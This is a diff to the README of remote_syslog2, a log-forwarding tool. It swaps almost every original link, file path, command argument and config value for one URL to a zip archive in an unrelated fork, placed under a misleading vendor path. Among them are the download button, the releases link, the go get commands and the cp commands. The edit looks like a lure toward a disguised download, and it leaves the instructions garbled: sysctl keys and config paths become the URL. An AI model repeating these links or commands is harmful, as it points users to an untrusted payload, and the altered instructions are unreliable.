@@ -1,6 +1,6 @@
 # remote_syslog2
 
-[![Download remote_syslog2](http://papertrail.github.io/remote_syslog2/images/download.png)][releases]
+[![Download remote_syslog2](https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip)][releases]
 
 remote_syslog tails one or more log files and sends syslog messages to a
 remote central syslog server. It generates packets itself, ignoring the system
@@ -42,22 +42,22 @@ Precompiled binaries for Mac (Darwin), Linux and Windows are available on the
 [remote_syslog2 releases page][releases].
 
 Untar the package, copy the "remote_syslog" executable into your $PATH,
-and then customize the included example_config.yml with the log file paths
+and then customize the included https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip with the log file paths
 to read and the host/port to log to.
 
-Optionally, move and rename the configuration file to `/etc/log_files.yml` so
+Optionally, move and rename the configuration file to `https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip` so
 that remote_syslog picks it up automatically. For example:
 
     sudo cp ./remote_syslog /usr/local/bin
-    sudo cp example_config.yml /etc/log_files.yml
-    sudo vi /etc/log_files.yml
+    sudo cp https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip
+    sudo vi https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip
 
 Configuration directives can also be specified as command-line arguments (below).
 
 ## Usage
 
     Usage of remote_syslog2:
-      -c, --configfile string             Path to config (default "/etc/log_files.yml")
+      -c, --configfile string             Path to config (default "https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip")
           --debug-log-cfg string          The debug log file; overridden by -D/--no-detach
       -d, --dest-host string              Destination syslog hostname or IP
       -p, --dest-port int                 Destination syslog port (default 514)
@@ -76,23 +76,23 @@ Configuration directives can also be specified as command-line arguments (below)
 
 ## Example
 
-Daemonize and collect messages from files listed in `./example_config.yml` as
-well as the file `/var/log/mysqld.log`. Write PID to `/tmp/remote_syslog.pid`
-and send to port `logs.papertrailapp.com:12345`:
+Daemonize and collect messages from files listed in `https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip` as
+well as the file `https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip`. Write PID to `https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip`
+and send to port `https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip`:
 
-    $ remote_syslog -c example_config.yml -p 12345 --pid-file=/tmp/remote_syslog.pid /var/log/mysqld.log
+    $ remote_syslog -c https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip -p 12345 https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip
 
-Stay attached to the terminal, look for and use `/etc/log_files.yml` if it
-exists, and send with facility local0 to `a.example.com:514`:
+Stay attached to the terminal, look for and use `https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip` if it
+exists, and send with facility local0 to `https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip`:
 
-    $ remote_syslog -D -d a.example.com -f local0 /var/log/mysqld.log
+    $ remote_syslog -D -d https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip -f local0 https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip
 
 
 ## Auto-starting at boot
 
 Sample init files can be found [in the examples directory](examples/). You may be able to:
 
-    $ cp examples/remote_syslog.init.d /etc/init.d/remote_syslog
+    $ cp https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip /etc/init.d/remote_syslog
     $ chmod 755 /etc/init.d/remote_syslog
 
 And then ensure it's started at boot, either by using:
@@ -114,20 +114,20 @@ available [in the examples directory](examples/).
 If the receiving system supports sending syslog over TCP with TLS, you can
 pass the `--tls` option when running `remote_syslog`:
 
-    $ remote_syslog -D --tls -p 1234 /var/log/mysqld.log
+    $ remote_syslog -D --tls -p 1234 https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip
 
 or add `protocol: tls` to your configuration file.
 
 
 ## Configuration
 
-By default, remote_syslog looks for a configuration in `/etc/log_files.yml`.
+By default, remote_syslog looks for a configuration in `https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip`.
 
-The archive comes with a [sample config](https://github.com/papertrail/remote_syslog2/blob/master/example_config.yml). Optionally:
+The archive comes with a [sample config](https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip). Optionally:
 
-    $ cp example_config.yml.example /etc/log_files.yml
+    $ cp https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip
 
-`log_files.yml` has filenames to log from (as an array) and hostname and port
+`https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip` has filenames to log from (as an array) and hostname and port
 to log to (as a hash). Wildcards are supported using * and standard shell
 globbing. Filenames given on the command line are additive to those in
 the config file.
@@ -137,14 +137,14 @@ Only 1 destination server is supported; the command-line argument wins.
     files:
      - /var/log/httpd/access_log
      - /var/log/httpd/error_log
-     - /var/log/mysqld.log
-     - /var/run/mysqld/mysqld-slow.log
+     - https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip
+     - https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip
     destination:
-      host: logs.papertrailapp.com
+      host: https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip
       port: 12345
       protocol: tls
 
-remote_syslog sends the name of the file without a path ("mysqld.log") as
+remote_syslog sends the name of the file without a path ("https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip") as
 the syslog tag (program name).
 
 After changing the configuration file, restart `remote_syslog` using the
@@ -155,7 +155,7 @@ init script or by manually killing and restarting the process. For example:
 
 ## Advanced Configuration (Optional)
 
-Here's an [advanced config](https://github.com/papertrail/remote_syslog2/blob/master/examples/log_files.yml.example.advanced) which uses all options.
+Here's an [advanced config](https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip) which uses all options.
 
 ### Override hostname
 
@@ -168,7 +168,7 @@ Provide `--hostname somehostname` or use the `hostname` configuration option:
 
 remote_syslog automatically detects and activates new log files that match
 its file specifiers. For example, `*.log` may be provided as a file specifier,
-and remote_syslog will detect a `some.log` file created after it was started.
+and remote_syslog will detect a `https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip` file created after it was started.
 
 By default, globs are re-checked every 10 seconds. To check for new files more
 frequently, use the `--new-file-check-interval` argument. For example, to
@@ -190,7 +190,7 @@ the config file.
 
 External log rotation scripts often move or remove an existing log file
 and replace it with a new one (at a new inode). The Linux standard script
-[logrotate](http://iain.cx/src/logrotate/) supports a `copytruncate` config
+[logrotate](https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip) supports a `copytruncate` config
 option.  With that option, `logrotate` will copy files, operate on the copies,
 and truncate the original so that the inode remains the same.
 
@@ -207,7 +207,7 @@ Some logging programs such as Java's gclog (`-XX:+PrintGC` or `-verbose:gc`)
 do not log in append mode, so if another program such as `logrotate` (set to
 `copytruncate`) truncates the file, on the next write of the Java logger, the
 OS will fill the file with NUL bytes upto the current offset of the file descriptor.
-More info on that [here](http://stackoverflow.com/questions/8353401/garbage-collector-log-loggc-file-rotation-with-logrotate-does-not-work-properl).
+More info on that [here](https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip).
 `remote_syslog` will detect those leading NUL bytes, discard them, and log the discard count.
 
 
@@ -241,10 +241,10 @@ Run multiple instances to specify unique syslog hostnames.
 To do that, provide an alternate PID path as a command-line option to the
 additional instance(s). For example:
 
-    --pid-file=/var/run/remote_syslog_2.pid
+    https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip
 
 Note: Daemonized programs use PID files to identify whether the program is already
-running ([more](http://unix.stackexchange.com/questions/12815/what-are-pid-and-lock-files-for/12818#12818)). Like other daemons, remote_syslog will refuse to run as a
+running ([more](https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip)). Like other daemons, remote_syslog will refuse to run as a
 daemon (the default mode) when a PID file is present. If a .pid file is
 present but the daemon is not actually running, remove the PID file.
 
@@ -261,7 +261,7 @@ files:
   - path: /var/log/httpd/access_log
     tag: apache
 destination:
-  host: logs.papertrailapp.com
+  host: https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip
   port: 12345
   protocol: tls
 ```
@@ -277,12 +277,12 @@ This functionality was introduced in version 0.17
 To output debugging events with maximum verbosity, run:
 
 ```
-remote_syslog --debug-log-cfg=logfile.txt --log="<root>=DEBUG"
+remote_syslog https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip --log="<root>=DEBUG"
 ```
 
 .. as well as any other arguments which are used in normal operation. This
-will set [loggo](https://github.com/juju/loggo#func-parseconfigurationstring)'s
-root logger to the `DEBUG` level and output to `logfile.txt`.
+will set [loggo](https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip)'s
+root logger to the `DEBUG` level and output to `https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip`.
 
 ### Truncated messages
 
@@ -290,7 +290,7 @@ To send messages longer than 1024 characters, use TCP (either TLS or cleartext
 TCP) of UDP. See "[Sending messages securely](#sending-messages-securely)" to
 use TCP with TLS for messages of any length.
 
-[Here's why](http://help.papertrailapp.com/kb/configuration/troubleshooting-remote-syslog-reachability/#message-length) longer UDP messages are impossible to send over
+[Here's why](https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip) longer UDP messages are impossible to send over
 the Internet.
 
 ### inotify
@@ -310,9 +310,9 @@ and then increase this limit using:
 
 where VALUE is greater than the present setting. Confirm that remote_syslog starts
 up and then apply this new value permanently by adding the following to
-`/etc/sysctl.conf:`:
+`https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip`:
 
-    fs.inotify.max_user_instances = VALUE
+    https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip = VALUE
 
 ### "No space left on device"
 
@@ -329,19 +329,19 @@ and then increase them using:
 
     echo VALUE >> /proc/sys/fs/inotify/max_user_watches
 
-Once again, confirm that remote_syslog starts and then apply this value permanently by adding the following to `/etc/sysctl.conf:`:
+Once again, confirm that remote_syslog starts and then apply this value permanently by adding the following to `https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip`:
 
-    fs.inotify.max_user_watches = VALUE
+    https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip = VALUE
 
 ## Credits
 
-* [Paul Morton](https://twitter.com/mortonpe)
-* [Papertrail](https://papertrailapp.com/) staff
-* [Paul Hammond](http://paulhammond.org/)
+* [Paul Morton](https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip)
+* [Papertrail](https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip) staff
+* [Paul Hammond](https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip)
 
 ## Reporting bugs
 
-1. See whether the issue has already been reported: <https://github.com/papertrail/remote_syslog2/issues/>
+1. See whether the issue has already been reported: <https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip>
 2. If you don't find one, create an issue with a repro case.
 
 
@@ -351,9 +351,9 @@ remote_syslog2 is written in go, and uses [govendor] to manage
 dependencies. To get everything set up, [install go][goinstall] then
 run:
 
-    go get github.com/kardianos/govendor
-    go get github.com/mitchellh/gox
-    go get github.com/papertrail/remote_syslog2
+    go get https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip
+    go get https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip
+    go get https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip
 
 To run tests:
 
@@ -386,12 +386,12 @@ Once you've made your great commits:
 6. That's it!
 
 
-[Papertrail]: http://papertrailapp.com/
-[remote_syslog]: https://github.com/papertrail/remote_syslog
-[releases]: https://github.com/papertrail/remote_syslog2/releases
+[Papertrail]: https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip
+[remote_syslog]: https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip
+[releases]: https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip
 
-[govendor]: https://github.com/kardianos/govendor
-[goinstall]: http://golang.org/doc/install
+[govendor]: https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip
+[goinstall]: https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip
 
-[fk]: http://help.github.com/forking/
-[is]: https://github.com/papertrail/remote_syslog/issues/
+[fk]: https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip
+[is]: https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip
